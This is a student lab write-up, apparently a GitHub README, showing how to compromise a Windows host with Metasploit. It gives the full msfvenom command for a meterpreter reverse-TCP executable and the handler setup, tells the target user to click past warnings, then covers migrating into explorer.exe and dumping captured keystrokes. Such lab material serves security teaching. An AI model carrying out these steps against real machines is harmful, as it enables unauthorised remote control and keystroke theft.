# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

# program:
Find the attackers ip address using ifconfig

# OUTPUT:
# ![Screenshot 2024-04-20 203055](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/b2888269-f599-4d87-911b-de6bdf501078)



Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

# ![Screenshot 2024-04-20 203202](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/b2d3a40a-7341-47cf-8de0-3410a840f6d9)

copy the fun.exe into the apache /var/www/html folder 
# ![Screenshot 2024-04-20 203330](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/e55aa7c5-d4a4-452f-ae71-05422bb91b35)


Start apache server sudo systemctl apache2 start

# ![Screenshot 2024-04-20 203415](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/ec6204e4-f294-4163-b4ed-3566f7618a18)


Check the status of apache2 
# ![Screenshot 2024-04-20 203507](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/bc5d0ba5-4f70-4c67-a8b0-145a687f8bcd)


# Invoke msfconsole:

## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

# ![Screenshot 2024-04-20 203609](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/39832c70-f93e-4e98-b82a-c2e13321aca4)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
# ![Screenshot 2024-04-20 203732](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/8aa33484-d24a-4dd2-85ea-e116c306c4d6)



Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 
# ![Screenshot 2024-04-20 203835](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/9d7e052a-234d-49bf-afd4-9d1de17e37ea)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
# ![Screenshot 2024-04-20 203918](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/eae2d001-f110-4982-915a-297b22226b23)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
# ![Screenshot 2024-04-20 204009](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/bffd2039-34a8-4bbc-bd9b-81baa236c041)


keyscan_dump Shows the keystrokes captured so far 
# ![Screenshot 2024-04-20 204104](https://github.com/DEEPAK22003907/Compromising-windows-using-Metasploit/assets/119404520/013285f8-51c1-48a8-8a51-bf584456990f)




## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
